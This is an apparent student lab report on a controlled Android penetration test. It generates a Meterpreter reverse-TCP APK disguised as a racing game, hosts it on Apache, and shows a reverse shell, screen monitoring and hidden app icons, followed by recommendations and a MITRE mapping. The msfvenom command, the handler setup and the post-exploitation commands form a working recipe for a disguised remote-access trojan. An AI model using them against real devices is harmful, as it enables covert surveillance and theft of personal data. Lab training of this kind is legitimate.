# Android Penetration Testing Lab

## 1. Executive Summary

### Approach

This assessment focused on demonstrating how a malicious Android application could be created and used to gain access to an Android device in a controlled virtual lab environment. The assessment used Kali Linux as the attacker machine and an Android x86 virtual machine as the target.

The testing involved creating an Android Meterpreter reverse TCP payload, disguising it as a gaming application, hosting the APK on an Apache web server, and downloading it onto the Android VM. After the application was executed, a Meterpreter session was established between the Android VM and Kali Linux. Several Meterpreter commands were then tested to determine what access and monitoring capabilities were available.

### Scope

The scope of this assessment was limited to the Android x86 virtual machine and the Kali Linux attacker machine used in the lab. The Android VM was used instead of a physical mobile device so that the testing could be performed in an isolated and controlled environment.

The assessment included:

- Creation and delivery of a malicious Android APK
- Establishment of a Meterpreter session
- Review of application permissions
- Testing of available Meterpreter commands
- Screen monitoring through `screenshare`
- Testing the ability to hide the application icon
- Attempted access to contact information
- Attempted wireless geolocation

No physical devices or external users were included in the assessment.

### Assessment Overview

The objective of this project was to generate and deploy a malicious APK using Metasploit to attack an Android device and understand the security risks this can pose. This was done using an Android x86 VM, which allowed us to test the software inside a virtual environment rather than on a physical phone or device.

The malicious APK was configured to look like a gaming app to lure the victim into downloading it. The goal was to see what data we could access from the target and how we could monitor their device. This was completed through a combination of social engineering and technical understanding, or lack thereof. By taking advantage of a victim's behaviors, attackers can target users in ways that may lead to successful exploitation.

Through this testing, I was able to establish a Meterpreter session, view the live device screen through screenshare, and hide the app icon on the phone to make the application less noticeable to the user. I also attempted to access the user's contacts, but no contacts were found. I additionally attempted to use `wlan_geolocate`, which is intended to determine a user's physical location by scanning nearby Wi-Fi networks, but I was not able to demonstrate successful geolocation during this lab.

## 2. Recommendations & Remediations

### Short-Term Recommendations

#### Review Application Permissions

When an application requests permissions that are broader than its expected functionality, users and developers should first understand why the app needs those privileges and clearly explain the benefits to the user. Any requests that are unnecessary should be denied. If extended privileges are required, it is important to implement in-context requests, such as "Only while using the app," rather than full unrestricted access whenever possible.

#### Avoid Untrusted APK Sources

Users should consider where an APK comes from before downloading and installing it. They should also review what permissions the application requires and what data it may access. Common permissions include location, camera, microphone, storage/photos/files, contacts, and network access.

Permissions can create security risks if an application is malicious or compromised. Users should also review privacy statements to understand how their data may be stored, shared, or sold. Unnecessary access to personal information can increase the risk of data leakage, identity theft, financial loss, and unwanted marketing.

### Medium-Term Recommendations

#### Strengthen Android Application Controls

During the assessment, Android security features initially blocked the application from being installed. In one instance, an option to continue the installation was available, while another attempt did not provide that option. The application was eventually installed after the Play Protect scanning feature was disabled.

This demonstrates the importance of keeping Android security features enabled. Additional safeguards around disabling or overriding security protections could provide another barrier against users intentionally or unintentionally installing potentially harmful applications.

#### Monitor Suspicious Application Behavior

Repeated failed downloads or installation attempts could be one indicator of unusual application activity, especially when combined with other warning signs. Organizations should consider monitoring for unusual application installation behavior and investigate activity that does not match normal user behavior.

### Long-Term Recommendations

#### Continue User Security Awareness Training

Users should receive ongoing training about the risks of downloading applications from untrusted sources. Training should cover how malicious applications can be disguised as legitimate software and why users should pay attention to application permissions and security warnings.

#### Maintain Mobile Security Controls

Organizations should maintain mobile security controls that prevent or limit the installation of applications from untrusted sources. Security policies should also discourage users from disabling built-in protections such as application scanning unless there is a legitimate and controlled reason to do so.

## 3. Technical Findings

### Methodology

The assessment was conducted within an isolated virtual lab environment consisting of a Kali Linux attacker machine and an Android x86 virtual machine acting as the target. The objective was to demonstrate how a malicious Android application could be used to establish a remote Meterpreter session and evaluate the level of access available after successful execution.

#### Tools Used

The following tools were used during the assessment:

- **Kali Linux** — Attacker operating system and testing environment
- **Metasploit Framework** — Used to create the Android payload and manage the Meterpreter session
- **msfvenom** — Used to generate the Android Meterpreter APK
- **Meterpreter** — Used to interact with the compromised Android VM and test available capabilities
- **Apache** — Used to host the APK so it could be downloaded by the Android VM
- **VirtualBox** — Used to run the Android x86 virtual machine
- **Android x86** — Target operating system used for the controlled lab
- **Web browser** — Used on the Android VM to access and download the hosted APK

#### 1. Lab Environment Setup

I started by setting up an Android x86 virtual machine in VirtualBox to use as my target. I used Kali Linux as the attacker machine. The Android VM was running Android 9, and I confirmed that Kali and the Android VM were on the same network. Kali had the IP address `10.0.2.5` and the Android VM had the IP address `10.0.2.8`.

![Android VM](screenshots/01-android-vm.png)

![Kali IP Address](screenshots/15-ip-address.png)

#### 2. Setting Up the Tools

I used Metasploit Framework and Meterpreter for the lab. I also used Apache to host the APK file so that I could download it onto the Android VM.

I first checked that Metasploit was installed on Kali. The system showed that Metasploit Framework version 6.5.3 was already installed.

I then created a `games` folder in the Apache web directory and checked that the folder was available.

![Metasploit Installation](screenshots/12-metasploit-install.png)

![Apache Status](screenshots/13-apache-status.png)

![Web Directory](screenshots/14-web-directory.png)

#### 3. Creating the APK

Next, I used `msfvenom` to create an Android Meterpreter reverse TCP payload. I configured it to connect back to my Kali machine at `10.0.2.5` using port `4444`.

The APK was named `car-race.apk` and was saved in the Apache web directory.

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > /var/www/html/games/car-race.apk
```

The generated APK was placed in the `games` directory so it could be accessed through the Apache web server.

![Payload Hosted](screenshots/18-payload-hosted.png)

I did run into an issue with the APK during the first attempt, so I had to regenerate it before continuing with the lab.

#### 4. Downloading the APK

Once the APK was hosted, I opened the Android VM's browser and went to:

```text
10.0.2.5/games/
```

This allowed me to download the APK onto the Android VM.

![Android Download](screenshots/09-android-download.png)

Android's security features initially caused some issues with installing the application. After working through the installation issue, I was able to get the application running on the Android VM.

The application appeared in the Android app drawer as `MainActivity`.

![Android App Drawer](screenshots/19-app-drawer.png)

#### 5. Reviewing Permissions

I also looked at the permissions requested by the application. The application requested access to several areas of the device, including contacts, call logs, SMS, location, the camera, microphone, phone calls, and system settings.

I included this as part of the lab because it showed how much access an application can potentially request from a device.

![Application Permissions](screenshots/02-permissions.png)

#### 6. Setting Up the Metasploit Handler

After creating and installing the APK, I set up a Metasploit `multi/handler` to wait for the Android device to connect back to Kali.

The handler was configured to listen on port `4444`.

![Meterpreter Handler](screenshots/16-handler.png)

![Handler Options](screenshots/17-handler-options.png)

#### 7. Establishing the Meterpreter Session

Once the application was running on the Android VM, it connected back to my Kali machine. This successfully opened a Meterpreter session.

The connection showed:

```text
Meterpreter session 1 opened (10.0.2.5:4444 -> 10.0.2.8:60106)
```

This confirmed that I had successfully established a Meterpreter connection between the Android VM and Kali.

#### 8. Gathering Information About the Android VM

After getting the session, I used the `sysinfo` command to see information about the Android device.

The results showed that the target was running Android 9 on an x86_64 system.

![Meterpreter Sysinfo](screenshots/03-meterpreter-sysinfo.png)

I also looked through the Meterpreter help menu to see what commands were available for the Android target.

![Meterpreter Help](screenshots/20-meterpreter-help.png)

#### 9. Testing Meterpreter Commands

I then tested a few of the available Meterpreter commands.

First, I tried `dump_contacts` to see if I could retrieve contact information from the Android VM. The command returned:

```text
No contacts were found!
```

![Dump Contacts](screenshots/04-dump-contacts.png)

I also tested the `screenshare` command. This was successful and allowed me to view the Android VM's screen through the Meterpreter session.

![Screenshare](screenshots/05-screenshare.png)

Finally, I tested the ability to hide the application's icon. My first command was:

```text
hide_app_icon_MainActivity
```

This did not work and returned:

```text
Unknown command
```

![Failed Hide App Icon Command](screenshots/06-hide-app-failed.png)

I then corrected the command to:

```text
hide_app_icon MainActivity
```

This time, the command worked and returned:

```text
Activity MainActivity was hidden
```

![Successful Hide App Icon Command](screenshots/07-hide-app-success.png)

After running the command, `MainActivity` was no longer visible in the Android application drawer.

![App Hidden](screenshots/08-app-hidden.png)

#### 10. Documenting the Results

Throughout the lab, I took screenshots of the different steps and results. I documented both the things that worked and the things that did not work. This included the APK installation issues, the failed `hide_app_icon` command, the successful Meterpreter connection, and the Meterpreter commands I tested.

### Troubleshooting

Several issues occurred during the lab that required troubleshooting before testing could continue.

The first issue involved the APK itself. During the first attempt to create the APK, the file did not generate correctly, so I regenerated the payload before continuing.

The Android VM also initially blocked the application during installation because of Android's built-in security protections. I had to work through the installation issue before the application could be successfully run.

There was also an issue with the `hide_app_icon` command. My first attempt used:

```text
hide_app_icon_MainActivity
```

Meterpreter returned `Unknown command`. After checking the available commands and correcting the syntax, I used:

```text
hide_app_icon MainActivity
```

The corrected command successfully hid the application icon.

During the lab, the Kali terminal and Meterpreter session also appeared to become unresponsive at one point. I attempted several ways to regain control of the terminal before using the VirtualBox controls and Android console to reboot the environment. The lab later expired due to inactivity, so I resumed the environment and continued the testing until the required activities were completed.

### MITRE ATT&CK Mapping

The following MITRE ATT&CK techniques were identified based on activities that were actually demonstrated during this assessment.

| Technique | Name | How It Applied |
|---|---|---|
| [T1628.001](https://attack.mitre.org/techniques/T1628/001/) | Hide Artifacts: Suppress Application Icon | The application icon was successfully hidden from the Android app drawer. |
| [T1513](https://attack.mitre.org/techniques/T1513/) | Screen Capture | Meterpreter `screenshare` was successfully used to view the Android device screen. |
| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | User Execution: Malicious File | The APK was disguised as a gaming application and relied on the user downloading and executing it. |
| [T1437.001](https://attack.mitre.org/techniques/T1437/001/) | Application Layer Protocol: Web Protocols | HTTP was used through Apache to host and deliver the APK to the Android VM. |

**Note:** T1628.001, T1513, and T1437.001 are MITRE ATT&CK Mobile techniques relevant to Android. T1204.002 is an Enterprise technique and is included here as a supporting technique for the user-execution/social-engineering portion of the lab.

### Technical Findings

#### Finding 1 — Malicious APK Execution

**Description:**  
A malicious Android APK was created using `msfvenom` and configured to establish a reverse TCP connection back to the Kali Linux attacker machine.

**Evidence:**  
The payload was configured with Kali's IP address (`10.0.2.5`) and port `4444`. After the application was executed on the Android VM, a Meterpreter session was successfully opened.

**Result:**  
The successful Meterpreter connection demonstrated that a malicious application could provide remote access to the target when executed.

#### Finding 2 — Excessive Application Permissions

**Description:**  
The application requested permissions that provided access to multiple sensitive areas of the Android device.

**Evidence:**  
The permission screen showed requests involving contacts, call logs, SMS, location, camera, microphone, phone calls, and system settings.

**Result:**  
The permissions demonstrated how a malicious or overly privileged application could potentially gain access to sensitive device functionality if those permissions were granted.

#### Finding 3 — Screen Monitoring

**Description:**  
The Meterpreter `screenshare` command was used to view the Android device's screen remotely.

**Evidence:**  
The screenshare session successfully displayed the Android VM screen and showed the target's browser activity.

**Result:**  
This demonstrated that an attacker with an established Meterpreter session could monitor the target device's screen.

#### Finding 4 — Application Icon Hiding

**Description:**  
The Meterpreter session was used to hide the application's icon from the Android application drawer.

**Evidence:**  
The command `hide_app_icon MainActivity` returned `Activity MainActivity was hidden`, and the application was no longer visible in the app drawer.

**Result:**  
This demonstrated a method that could make a malicious application less noticeable to a device user.

#### Finding 5 — Contact Access Attempt

**Description:**  
The `dump_contacts` command was tested to determine whether contact information could be retrieved from the Android VM.

**Evidence:**  
The command returned:

```text
No contacts were found!
```

**Result:**  
Contact information was not successfully retrieved during this assessment.

#### Finding 6 — Wireless Geolocation Attempt

**Description:**  
The `wlan_geolocate` command was attempted to determine whether the target's physical location could be identified using nearby Wi-Fi networks.

**Evidence:**  
The command was attempted during the Meterpreter testing.

**Result:**  
Successful geolocation was not demonstrated during this lab.

## 4. Appendices

### Appendix A — Screenshots

The following screenshots were collected as evidence throughout the assessment:

| Screenshot | Description |
|---|---|
| `01-android-vm.png` | Android x86 virtual machine |
| `02-permissions.png` | Application permissions |
| `03-meterpreter-sysinfo.png` | Meterpreter system information |
| `04-dump-contacts.png` | Contact access attempt |
| `05-screenshare.png` | Successful screenshare |
| `06-hide-app-failed.png` | Failed hide app icon command |
| `07-hide-app-success.png` | Successful hide app icon command |
| `08-app-hidden.png` | Application hidden from app drawer |
| `09-android-download.png` | APK download on Android VM |
| `10-vm-files.png` | Android VM files |
| `11-extracted-ova.png` | Extracted Android OVA |
| `12-metasploit-install.png` | Metasploit installation verification |
| `13-apache-status.png` | Apache service status |
| `14-web-directory.png` | Apache web directory |
| `15-ip-address.png` | Kali IP address |
| `16-handler.png` | Metasploit handler |
| `17-handler-options.png` | Handler configuration |
| `18-payload-hosted.png` | Hosted APK payload |
| `19-app-drawer.png` | Application visible in app drawer |
| `20-meterpreter-help.png` | Meterpreter help menu |

### Appendix B — Commands Used

```bash
# Check Kali network configuration
ip a

# Create directory for the hosted APK
mkdir /var/www/html/games

# Generate the Android Meterpreter APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 R > /var/www/html/games/car-race.apk
```

Metasploit handler configuration:

```text
use exploit/multi/handler
set payload android/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

Meterpreter commands tested:

```text
sysinfo
help
dump_contacts
screenshare
hide_app_icon_MainActivity
hide_app_icon MainActivity
wlan_geolocate
```

### Appendix C — Lab Environment Information

**Attacker Machine**

- Operating System: Kali Linux
- IP Address: `10.0.2.5`
- Metasploit Framework: 6.5.3
- Listener Port: `4444`

**Target Machine**

- Operating System: Android 9
- IP Address: `10.0.2.8`
- Architecture: x86_64
- Linux Kernel: `4.19.110-android-x86_64-g066cc1d`
- Meterpreter: `dalvik/android`

**Payload**

- Payload Type: `android/meterpreter/reverse_tcp`
- APK Name: `car-race.apk`
- Hosting Directory: `/var/www/html/games/`
- Delivery Method: HTTP through Apache
